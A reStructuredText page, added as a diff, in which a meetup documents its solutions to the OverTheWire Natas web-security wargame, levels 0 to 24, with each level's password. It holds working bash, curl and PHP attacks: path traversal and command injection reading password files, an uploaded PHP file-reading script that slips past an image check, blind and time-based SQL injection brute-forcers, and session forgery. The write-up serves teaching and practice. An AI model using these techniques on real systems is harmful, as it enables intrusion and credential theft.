@@ -1,0 +1,944 @@
+.. include:: /pentest_links.txt
+
+.. _Natas:
+
+*****
+Natas
+*****
+
+This is to document the meetup's efforts responding to the challenge `OverTheWire Natas <http://overthewire.org/wargames/natas/>`_. Natas teaches the basics of serverside web security. It starts with username, password, url natas0, natas0, http://natas0.natas.labs.overthewire.org and the next level's password stored in /etc/natas_webpass/netas1. The numbers bump by one for each level until the final level of 27. We'll use `OVERTHEWIRE – NATAS – LEVEL 0-20 – WRITEUP — UPDATED <http://nsimattstiles.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/>`_ as a guide to the answers for levels 0 - 20.
+
+
+`Natas Level 0 -> 1 <http://natas0.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 0 Password = "natas0"
+
+Simply view the page source.
+
+`Natas Level 1 -> 2 <http://natas1.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 1 Password = "gtVrDuiDfck831PqWsLEZy5gyDz1clto"
+
+Simply view the page source.
+
+`Natas Level 2 -> 3 <http://natas2.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 2 Password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
+
+The page source reveals a reference to /files/pixel.png, so opening up `http://natas2.natas.labs.overthewire.org/files <http://natas2.natas.labs.overthewire.org/files>`_ reveals a users.txt file containing the password.
+
+
+`Natas Level 3 -> 4 <http://natas3.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 3 Password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
+
+The hint is about Google not finding it, so open `http://natas3.natas.labs.overthewire.org/robots.txt <http://natas3.natas.labs.overthewire.org/robots.txt>`_ to find *Disallow: /s3cr3t/* and in the directory /s3cr3t/ you'll find another users.txt file containing the password.
+
+`Natas Level 4 -> 5 <http://natas4.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 4 Password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ wget http://natas4.natas.labs.overthewire.org/  \
+       --header='Referer: http://natas5.natas.labs.overthewire.org/'  \
+       --user natas4  --password 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
+   ###################### SNIP ######################
+   2014-07-17 09:30:43 (84.2 MB/s) - ‘index.html’ saved [962/962]
+
+   me@myhost:~/Natas$ grep natas5 index.html
+   Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+
+
+`Natas Level 5 -> 6 <http://natas5.natas.labs.overthewire.org/>`_
+==================================================================
+
+Level 5 Password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+
+Viewing your cookies in your browser you notice a cookie "loggedin" with value "0". Use your browser to change the value. For example in Google Chrome, in the developers console enter this javascript: ``document.cookie="loggedin=1"`` followed by refreshing the screen. Alternatively you can use ``wget``.
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ wget http://natas5.natas.labs.overthewire.org/  \
+       --user natas5  --password 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' \
+       --no-cookies --header 'Cookie: loggedin=1;'
+   ###################### SNIP ######################
+   2014-07-17 09:59:31 (76.6 MB/s) - ‘index.html’ saved [890/890]
+
+   me@myhost:~/Natas$ grep natas6 index.html
+   Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+
+
+
+`Natas Level 6 -> 7 <http://natas6.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 6 Password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+
+Follow the "View sourcecode" link. Open in "includes/secret.inc" reference found on that page to reveal ``$secret = "FOEIUWGHFEEUHOFUOIU";``. Enter that on the original Natas Level 6 page to get the password.
+
+
+`Natas Level 7 -> 8 <http://natas7.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 7 Password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+
+Viewing the page source reveals the hint "password for webuser natas8 is in /etc/natas_webpass/natas8". Looking at the url for the about page reveals the http get "index.php?page=about". Trying a get of `index.php?page=/etc/natas_webpass/natas8 <http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8>`_ reveals the password.
+
+
+`Natas Level 8 -> 9 <http://natas8.natas.labs.overthewire.org/>`_
+=================================================================
+
+Level 8 Password = "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
+
+The web page has a "view sourcecode" link which shows:
+
+|    "3d3d516343746d4d6d6c315669563362" ==
+|    bin2hex(strrev(base64_encode($secret)))
+
+
+Using python we compute the inverse to get the secret:
+
+
+.. code-block:: none
+
+   me@myhost:~/Natas$ python -c 'from binascii import a2b_base64, unhexlify;
+       print(a2b_base64(unhexlify("3d3d516343746d4d6d6c315669563362")[::-1]))'
+   oubWYf2kBq
+
+Then entering "oubWYf2kBq" input secret gets us the natas9 password "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl".
+
+
+`Natas Level 9 -> 10 <http://natas9.natas.labs.overthewire.org/>`_
+==================================================================
+
+Level 9 Password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
+
+The web page has a "view sourcecode" link which shows the form input value is used in a shell command: ``grep -i $key dictionary.txt``. So by setting the form value to ``1 /etc/natas_webpass/natas10`` will show the password as "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu".
+
+
+`Natas Level 10 -> 11 <http://natas10.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 10 Password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
+
+The web page has a "view sourcecode" link which shows the form input value is used in a shell command: ``grep -i $key dictionary.txt``. So by setting the form value to ``1 /etc/natas_webpass/natas10`` will show the password as "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK".
+
+`Natas Level 11 -> 12 <http://natas11.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 11 Password = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+
+The web page has a "view sourcecode" link which shows a php script function ``xor_encrypt`` with an unspecified encryption key "protecting" the cookie data which you have in your possession locally. After a little code reading, this exploit will take 2 steps: determine the key, then encrypt the data *array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")* to get a key which will show the next password.
+
+So how to get the key? First let's get the current cookie. It is just an "encrypted" form of *array("showpassword"=>"no", "bgcolor"=>"#ffffff")*. We can get that easily from the browser (in Chrome via the developer tools to see it is "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw") or we can run ``ngrep`` when we refresh the browser window:
+
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ sudo ngrep -lpd eth0 "^GET |^POST" \
+       host natas10.natas.labs.overthewire.org
+   ###################### SNIP ######################
+   ###########
+   T 192.168.1.23:58290 -> 178.79.134.250:80 [AP]
+     GET /?bgcolor=%23ffffff HTTP/1.1..Host: natas11.natas.labs.overthewire.org.
+   ###################### SNIP ######################
+   Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D....                                            
+   ######
+
+The reason using ``xor`` is so bad is that we can take this "encrypted" cookie and use it as the encryption key against ``json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"))`` to get the original encryption key. We use the following php script
+
+.. code-block:: php
+
+   <?php
+
+   function xor_encrypt($in) {
+       // NOTE - replaced encryption key with cookie
+       $b64_cookie = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw';
+       $key = base64_decode($b64_cookie);
+       $text = $in;
+       $outText = '';
+
+       // Iterate through each character
+       for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+       }
+
+       return $outText;
+   }
+
+   $no_show = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+   fwrite(STDOUT, xor_encrypt((json_encode($no_show))));
+
+   ?>
+
+And when we run it we get the "hidden" xor key "qw8J":
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ php crack_xor.php
+   qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+
+So now that we have the key we can create an "encrypted" key for *array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")* via this php script:
+
+
+.. code-block:: php
+
+   <?php
+
+   function xor_encrypt($in) {
+       // NOTE - replaced encryption key with cookie
+       $key = 'qw8J';
+       $text = $in;
+       $outText = '';
+
+       // Iterate through each character
+       for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+       }
+
+       return $outText;
+   }
+
+   $yes_show = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+   fwrite(STDOUT, base64_encode(xor_encrypt((json_encode($no_show)))));
+
+   ?>
+
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ php encrypt.php
+   ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+So all that's left to do is to replace the "data" cookie with this value and re-fetch the page. You can either use your browser or use ``wget`` as follows:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ wget -q -O - http://natas11.natas.labs.overthewire.org//?bgcolor=%23ffffff  \
+   >   --no-cookies \
+   >   --header='Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK' \
+   >   --user='natas11' \
+   >   --password='U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK' | \
+   > grep natas12
+   The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
+
+
+
+`Natas Level 12 -> 13 <http://natas12.natas.labs.overthewire.org/>`_
+
+Level 12 Password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
+
+The web page has a "view sourcecode" link which shows a php script allowing a file upload. Careful analysis of the script shows that by overriding the hidden *filename* field with any filename with extension *.php* you can upload any php script to the */upload* directory, like *natas13.php* printing out the password file:
+
+
+.. code-block:: php
+
+   <?
+
+   $myFile = "/etc/natas_webpass/natas13";
+   $fh = fopen($myFile, 'r');
+   $theData = fread($fh, 32);
+   fclose($fh);
+   echo $theData;
+
+   ?>
+
+Here's the bash script *natas13.sh* using ``curl`` to display natas13's password. It assumes the above php code is the local file *natas13.php* seen above:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+   
+   upload=$( \
+     curl --silent \
+          --form action=index.php \
+          --form MAX_FILE_SIZE=1000 \
+          --form filename=natas13.php \
+          --form submit="Upload File" \
+          --form uploadedfile=@natas13.php \
+          --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
+          http://natas12.natas.labs.overthewire.org/ \
+     | grep 'a href="upload/' \
+   )
+   file=${upload#*upload/}
+   file=${file%%\"*}
+   curl --silent \
+        --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \
+        http://natas12.natas.labs.overthewire.org/upload/$file
+
+
+And running the code gives us the password:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas13.sh
+   jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+
+`Natas Level 13 -> 14 <http://natas13.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 13 Password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
+
+Basically a repeat of Level 12 except that the server-side script uses an ``exif_imagetype`` check to make sure the uploaded file is an image file. We circumvent that test by prepending the first 12 bytes of a jpeg downloaded from the web to an exploit php script, then proceed as in Level 12, except the url and username/password change to reflect Level 13. Here is the run:
+
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ # We start with modified versions of Level 12
+   me@myhost:~/Natas$ #   exploit.php outputs /etc/natas_webpass/natas14
+   me@myhost:~/Natas$ #   natas14.sh uploads exploit.php, gets the results
+   me@myhost:~/Natas$ ls
+   exploit.php  natas14.sh
+   me@myhost:~/Natas$ cat exploit.php 
+
+   <?
+
+   $myFile = "/etc/natas_webpass/natas14";
+   $fh = fopen($myFile, 'r');
+   $theData = fread($fh, 32);
+   fclose($fh);
+   echo $theData;
+
+   ?>
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ cat natas14.sh 
+   #!/usr/bin/env bash
+
+   upload=$( \
+     curl --silent \
+          --form action=index.php \
+          --form MAX_FILE_SIZE=1000 \
+          --form filename=natas14.php \
+          --form submit="Upload File" \
+          --form uploadedfile=@natas14.php \
+          --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+          http://natas13.natas.labs.overthewire.org/ \
+     | grep 'a href="upload/' \
+   )
+   file=${upload#*upload/}
+   file=${file%%\"*}
+   curl --silent \
+        --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+        http://natas13.natas.labs.overthewire.org/upload/$file |
+   tail -n1
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ 
+   me@myhost:~/Natas$ # Get first 12 bytes of random jpeg from web
+   me@myhost:~/Natas$ curl --silent --output -  http://www.exiv2.org/include/img_1771.jpg | head -c 12 > natas14.php
+   me@myhost:~/Natas$ # Add in the exploit.php = jpeg and php file
+   me@myhost:~/Natas$ cat exploit.php >> natas14.php
+   me@myhost:~/Natas$ # Run the exploit like in Level 12
+   me@myhost:~/Natas$ ./natas14.sh 
+   Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+
+
+`Natas Level 14 -> 15 <http://natas14.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 14 Password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
+
+ The web page has a "view sourcecode" link which shows a php script allowing a sql injection attack. Setting both the username and password fields to *'natas14" or 1 or "a'* yields the natas15 password of "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J".
+
+
+`Natas Level 15 -> 16 <http://natas15.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 15 Password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+
+ The web page has a "view sourcecode" link which shows another sql injection opportunity. Unfortunately the page doesn't display the results of the query, just whether or not more than 1 row was returned from the query. That can be exploited (with a certain amount of persistence) to get the password. For instance, you can start out entering *natas16" and LENGTH(password) = 32 and username="natas16* to see that the password has length 32 (like the other passwords). Since the other passwords were base64, you can create a script using mysql's ``SUBSTRING`` to brute force each password character in the base64 range. Here is a brute force bash script. (Note - we added BINARY to the query to get the comparisons to be case-sensitive. And ``grep`` is run using the default regular expressions so that + does not have special meaning.)
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   function try_guess()
+   {
+     local __resultvar=$1
+     local query="natas16\" and BINARY SUBSTRING(password,$2,1) = \"$3"
+     local hit=no
+     local curlout=$( \
+     curl --silent \
+          --form action=index.php \
+          --form username="$query" \
+          --form submit="Check existence" \
+          --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
+          http://natas15.natas.labs.overthewire.org/?debug=true 2>&1)
+     if [[ "$curlout" =~ "This user exists" ]]; then
+       hit=yes
+     elif [[ ! "$curlout" =~ "This user doesn't exist" ]]; then
+       echo "ERROR - no input received for guess $2"
+       exit 1
+     fi
+     [[ "$curlout" =~ "This user exists" ]] && hit="yes"
+     eval $__resultvar="'$hit'"
+   }
+
+   b64="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
+   ntries=${#b64}
+   guess=
+   known=
+
+   for (( i=1; i < 33; i++ )); do
+     echo "testing $i"
+     for (( j=0; j < ntries; j++ )); do
+       guess="${b64:j:1}"
+       try_guess result $i "$guess"
+       if [[ "$result" == "yes" ]]; then
+         known="$known$guess"
+         break
+       fi
+     done
+     if [[ ${#known} -ne $i ]]; then
+       echo "ERROR - password character $i failed"
+       exit 1
+     fi
+   done
+   echo "SUCCESS - password is $known"
+
+`Natas Level 16 -> 17 <http://natas16.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 16 Password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+ 
+The web page has a "view sourcecode" link which shows shell injection into the command ``passthru("grep -i \"$key\" dictionary.txt")``. By suitably selecting the input for ``$key`` we can brute force the password character-by-character.
+
+One approach (with much more complex coding but faster runtime) involved using ``$(cut -bN /etc/natas_webpass/natas17)`` as the input string, extracting out the N'th password character and for search against the dictionary. It has the advantage of needing less Natas web site hits: for each password that's a letter, 1 http PUT will narrow it down to the letter (upper or lower case because of the case-insensitive ``grep -i``) and another http PUT can determine the upper vs lower case. So character-by-character the character is cut out, if it has matches it's a letter and search the output to determine what letter (but you don't know if upper or lower case). The case can be determined by translating the lower/upper case character to 'a' and 'b', respectively and doing the search again. (For 'm' vs. 'M', translate them to 'a', 'b' respectively via ``$(expr substr ab $(expr index mM $(cut -b1 /etc/natas_webpass/natas17)) 1)``. Similarly you can translate 0-9, +, and / to a-m, respectively via ``$(expr substr abcdefhijklm $(expr index 0123456789+/ \\$(cut -b1 /etc/natas_webpass/natas17)) 1)``.) But the approach has one big flaw: it isn't easy to automate. If you needed to do this with a minimum of website hits and don't mind some manual steps it's great.
+
+But we want an approach that is easy to automate. That is, it generates no dictionary match output when we guess a password character correctly (avoiding the problem of determining lower vs. upper case hits, not to mention 0-9, +, and /). And generates a dictionary match output when we're wrong. Take the first string in *dictionary.txt* "African" and note that adding a character in front of it will get 0 search results but the bare term itself will generate 2. If we know the password starts with ABCD and want to guess E, input string ``$(grep '^ABCDE.*' /etc/natas_webpass/natas17)African`` will result in either empty search results if we're right, or search hits if we're not. So we can do another brute force over the 32 password characters guessing from the base64 character set. Here is a bash script to do just that. (Note - ``grep`` is run using the default regular expressions so that + does not have special meaning.)
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   function try_guess()
+   {
+     local __resultvar=$1
+     local word="African"
+     local hit
+     local curlout=$(curl --silent \
+          --form needle="\$(grep ^$2.* /etc/natas_webpass/natas17)$word" \
+          --form submit="Search" \
+          --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
+          http://natas16.natas.labs.overthewire.org/ 2>&1)
+     hit=yes
+     if [[ "$curlout" =~ "$word" ]]; then
+       hit=no
+     elif [[ ! "$curlout" =~ "Output:" ]]; then
+       echo "ERROR - no input received for guess $2"
+       exit 1
+     fi
+     eval $__resultvar="'$hit'"
+   }
+
+   # Use grep with default regular expressions so + is not special
+   b64="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
+   ntries=${#b64}
+   guess=
+   known=
+   nknown=0
+
+   for (( i=nknown+1; i < 33; i++ )); do
+     echo "testing $i"
+     for (( j=0; j < ntries; j++ )); do
+       guess="${known}${b64:j:1}"
+       sleep 2
+       echo guess=$guess
+       result=no
+       try_guess result "$guess"
+       echo result = $result
+       if [[ "$result" == "yes" ]]; then
+         known="$guess"
+         echo hit so known=$known
+         break
+       fi
+     done
+     if [[ ${#known} -ne $i ]]; then
+       echo "ERROR - password character $i failed"
+       exit 1
+     fi
+   done
+   echo "SUCCESS - password is $known"
+
+
+
+`Natas Level 17 -> 18 <http://natas17.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 17 Password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+ 
+The web page has a "view sourcecode" link which shows the normal page execution produces no query result output. We could use the approach of Level 15 -> 16 to guess the password character-by-character, but there's no physical output to determine if our password guesses are correct. However, there is a well-known trick called a time-based sql injection. Basically, you construct a query that if it succeeds it takes a long time to return, but failure returns quickly. So we can use the answer to Level 15 -> 16 modified to have a long delay if our password character guess is correct, but fail right away if the guess is wrong. All we need to do is check for the query taking a long time vs. checking for "This user exists".
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   function try_guess()
+   {
+     local __resultvar=$1
+     local query="natas18\" and IF (BINARY SUBSTRING(password,$2,1)"
+     query="$query = \"$3\", SLEEP(15), 0) and \"1"
+     local hit=no
+     local curlout
+     TIME1=$(date +%s)
+     curlout=$( \
+     curl --silent \
+          --form action=index.php \
+          --form username="$query" \
+          --form submit="Check existence" \
+          --user natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw \
+          http://natas17.natas.labs.overthewire.org/?debug=true 2>&1)
+     TIME2=$(date +%s)
+     if [[ "$curlout" =~ "Executing query" ]]; then
+       [[ $(( TIME2 - TIME1 )) -gt 10 ]] && hit=yes
+     else
+       echo "ERROR - no input received for guess $2"
+       exit 1
+     fi
+     eval $__resultvar="'$hit'"
+   }
+
+   b64="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
+   ntries=${#b64}
+   guess=
+   known=
+
+   for (( i=1; i < 33; i++ )); do
+     echo "guessing $i"
+     for (( j=0; j < ntries; j++ )); do
+       guess="${b64:j:1}"
+       try_guess result $i "$guess"
+       if [[ "$result" == "yes" ]]; then
+         known="$known$guess"
+         echo known so far = $known
+         break
+       fi
+     done
+     if [[ ${#known} -ne $i ]]; then
+       echo "ERROR - known so far = $known"
+       echo "ERROR - password character $i failed"
+       exit 1
+     fi
+   done
+   echo "SUCCESS - password is $known"
+
+
+`Natas Level 18 -> 19 <http://natas18.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 18 Password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
+ 
+The web page has a "view sourcecode" link which code analysis shows stores a PHPSESSID cookie. The following script guesses all possibly values of the session id to find one that has admin credentials.
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   for (( i=1; i <= 640; i++ )); do
+     curlout=$( \
+       curl --silent \
+            --cookie "PHPSESSID=$i" \
+            --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP \
+            http://natas18.natas.labs.overthewire.org/?debug=true \
+       )
+     if [[ "$curlout" =~ "The credentials for the next level" ]]; then
+       password=${curlout#*Password: }
+       password=${password%%</pre>*}
+       echo "PHPSESSID=$i yields password $password"
+       break
+     fi
+   done
+
+
+Running the script yields the password:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas18.sh
+   PHPSESSID=585 yields password 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+
+`Natas Level 19 -> 20 <http://natas19.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 19 Password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+
+Same as the prior level except session IDs are no longer sequential. Entering a user of "whoami" yields a cookie PHPSESSID = "3339302d77686f616d69", which is ascii "390-whoami". So we guess the admin session id's are NNN-admin and try those.
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   for (( i=1; i <= 640; i++ )); do
+   # for (( i=580; i <= 590; i++ )); do
+     sid=$(xxd -pu <<< "${i}-admin")
+     sid=${sid%??}
+     echo "Trying PHPSESSID=$sid"
+     curlout=$( \
+       curl --silent \
+            --cookie "PHPSESSID=$sid" \
+            --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs \
+            http://natas19.natas.labs.overthewire.org/?debug=true \
+       )
+     # echo "curlout=$curlout"
+     if [[ "$curlout" =~ "The credentials for the next level" ]]; then
+       password=${curlout#*Password: }
+       password=${password%%</pre>*}
+       echo "PHPSESSID=${i}-admin yields password $password"
+       break
+     fi
+   done
+
+Running the script yields the password:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas19.sh
+   PHPSESSID=501-admin yields password eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+
+`Natas Level 20 -> 21 <http://natas20.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 20 Password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
+
+The web page has a "view sourcecode" link which code analysis shows they use a custom method to store/retrieve session data. The key/value pairs are stored separated by "\\n". So 2 runs of ``curl`` will suffice to crack the password: (1) the first run gets a PHPSESSID and sets the name field to "admin\\nadmin 1" (with a real "\\n", not the literal text); (2) the second run will use the established PHPSESSID with the name field set to have the embedded newline create a session variable "admin" with value "1". Here is a script that automates the attack:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   curlout=$( \
+   curl --silent \
+        --form action=index.php \
+        --form name="name admin
+   admin 1" \
+        --form submit="Change name" \
+        --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
+        http://natas20.natas.labs.overthewire.org/?debug=true 2>&1 \
+   )
+
+   sid=${curlout#*DEBUG: MYWRITE }
+   sid=${sid%% *}
+   echo "PHPSESSID=$sid"
+
+   curlout=$( \
+   curl --silent \
+        --cookie "PHPSESSID=$sid" \
+        --form action=index.php \
+        --form name="name admin
+   admin 1" \
+        --form submit="Change name" \
+        --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
+        http://natas20.natas.labs.overthewire.org/?debug=true 2>&1 \
+   )
+   password=${curlout#*Password: }
+   password=${password%%</pre*>}
+
+   echo "password=$password"
+
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas20.sh
+   PHPSESSID=9cp51ros4m5eeq1oi6ilm5nd44
+   password=IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+
+
+`Natas Level 21 -> 22 <http://natas21.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 21 Password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
+
+The web page has an `experimenter version <http://natas21-experimenter.natas.labs.overthewire.org/>`_, both with a "view sourcecode" link. The hope is that a colocated web site will share session data, so when you exploit the experimenter site's form by injecting an "admin" input, the session can be used on the non-experimenter side to use that "admin" field to reveal the password. Here is the exploit code:
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   COOKIES=natas21-cookie.txt
+   cat /dev/null > $COOKIES
+
+   inject="yellow' /><br>admin: <input name='admin' value='1"
+   curlout=$( \
+   curl --silent \
+        --cookie-jar "$COOKIES" \
+        --form action=index.php \
+        --form align='center' \
+        --form admin='1' \
+        --form fontsize='100%' \
+        --form bgcolor="$inject" \
+        --form submit='Update' \
+        --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
+        http://natas21-experimenter.natas.labs.overthewire.org/?debug=true 2>&1 \
+   )
+
+   sid="$(cat $COOKIES)"
+   sid=${sid#*PHPSESSID?}
+   echo "PHPSESSID=$sid"
+
+   curlout=$( \
+   curl --silent \
+        --cookie "PHPSESSID=$sid" \
+        --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
+        http://natas21.natas.labs.overthewire.org/?debug=true 2>&1 \
+   )
+
+   password=${curlout#*Password: }
+   password=${password%%</pre>*}
+   echo "password=$password"
+   rm $COOKIES
+
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas21.sh
+   PHPSESSID=eeevtntuhp7l2sa0rr7c123ph7
+   password=chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+
+
+
+
+
+`Natas Level 22 -> 23 <http://natas22.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 22 Password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
+
+The web page has a "view sourcecode" link which code analysis shows the GET parameter "revelio" reveals the password only when the session has "admin" = 1. Here's the code for the exploit:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   curlout=$( \
+   curl --silent \
+        --form admin=1 \
+        --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ \
+        http://natas22.natas.labs.overthewire.org/?revelio=yes 2>&1 \
+   )
+
+   password=${curlout#*Password: }
+   password=${password%%</pre>*}
+   echo "password=$password"
+
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas22.sh
+   password=D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+
+
+`Natas Level 23 -> 24 <http://natas23.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 23 Password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
+
+The web page has a "view sourcecode" link which code analysis shows a particular "passwd" filled into a GET form will reveal the password. Here's the code for the exploit:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   curlout=$( \
+   curl --silent \
+        --form passwd="11 iloveyou" \
+        --user natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE \
+        http://natas23.natas.labs.overthewire.org/ 2>&1 \
+   )
+
+   password=${curlout#*Password: }
+   password=${password%%</pre>*}
+   echo "password=$password"
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas23.sh
+   password=OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+
+
+`Natas Level 24 -> 25 <http://natas24.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 24 Password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
+
+The web page has a "view sourcecode" link which code analysis shows will reveal the password when the ``strcmp($_REQUEST["passwd"],"<censored>")`` returns 0. Well, it turns out that if there is an error (like one of the types being an array vs. a string, it returns 0 or equal. Here's the code for the exploit:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   curlout=$( \
+   curl --silent \
+        --form passwd[]="" \
+        --user natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg \
+        http://natas24.natas.labs.overthewire.org/ 2>&1 \
+   )
+
+   password=${curlout#*Password: }
+   password=${password%%</pre>*}
+   echo "password=$password"
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas24.sh
+   password=GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+
+`Natas Level 25 -> 26 <http://natas25.natas.labs.overthewire.org/>`_
+====================================================================
+
